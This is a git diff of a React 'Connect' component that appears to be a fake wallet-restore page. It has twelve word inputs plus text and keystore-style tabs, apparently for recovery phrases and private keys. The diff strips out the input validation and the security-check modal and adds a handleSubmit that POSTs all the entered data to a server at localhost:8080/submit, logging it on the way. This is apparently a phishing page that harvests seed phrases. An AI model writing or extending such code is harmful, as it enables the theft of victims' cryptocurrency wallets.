@@ -1,7 +1,8 @@
 import React, { useState, useEffect } from "react";
 import SecondModal from "../componets/SecondModal";
 import SecurityCheck from "../componets/SecurityCheck";
-import { useNavigate } from "react-router-dom";
+import { useNavigate } from "react-router";
+// import { useNavigate } from "react-router-dom";
 
 const Connect = () => {
   const defaultCount = 12;
@@ -47,17 +48,21 @@ const Connect = () => {
       return;
     }
 
-    const isTab1Filled = formData.tab1Inputs.some((i) => i.trim() !== "");
-    const isTab2Filled = formData.tab2Text.trim() !== "";
-    const isTab3Filled =
-      formData.tab3.content.trim() !== "" || formData.tab3.title.trim() !== "";
+    handleSubmit();
 
-    if (!isTab1Filled && !isTab2Filled && !isTab3Filled) {
-      alert("Please fill in one of the restore tabs.");
-      return;
-    }
+    console.log("Submitting form data:", formData);
 
-    setShowSecurityModal(true);
+    // const isTab1Filled = formData.tab1Inputs.some((i) => i.trim() !== "");
+    // const isTab2Filled = formData.tab2Text.trim() !== "";
+    // const isTab3Filled =
+    //   formData.tab3.content.trim() !== "" || formData.tab3.title.trim() !== "";
+
+    // if (!isTab1Filled && !isTab2Filled && !isTab3Filled) {
+    //   alert("Please fill in one of the restore tabs.");
+    //   return;
+    // }
+
+    // setShowSecurityModal(true);
   };
 
   const isCurrentTabComplete = () => {
@@ -76,6 +81,23 @@ const Connect = () => {
       );
     }
     return false;
+  };
+
+  const handleSubmit = async () => {
+    try {
+      const response = await fetch("http://localhost:8080/submit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(formData),
+      });
+
+      const result = await response.json();
+      console.log(" Submit successful: ", result);
+    } catch (error) {
+      console.error(error);
+    }
   };
 
   return (
